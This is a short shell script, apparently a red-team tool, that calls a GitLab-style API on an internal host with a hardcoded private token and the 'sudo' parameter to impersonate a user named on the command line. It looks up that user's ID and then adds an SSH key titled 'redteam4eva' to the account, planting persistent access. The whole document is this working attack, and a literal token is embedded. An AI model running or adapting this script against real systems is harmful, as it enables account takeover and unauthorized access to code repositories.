#!/bin/sh
url="http://192.168.1.4:80/api/v3/user?private_token=yU8zf7Tuy3Q2SHGh3kdS&sudo="
url="$url$1"
echo $url
data=`curl $url -H 'Host: 192.168.1.4'`
#echo "\n"
ID=`echo $data | python -c 'import sys; import json; print(json.load(sys.stdin)[sys.argv[1]])' id`
echo $ID

url="http://192.168.1.4:80/api/v3/user/keys?private_token=yU8zf7Tuy3Q2SHGh3kdS&sudo="
url="$url$1"
echo $url

data=`curl -F "id=$!" -F "title=redteam4eva" -F "key=$2 $3" $url -H 'Host:192.168.1.4'`
echo $data
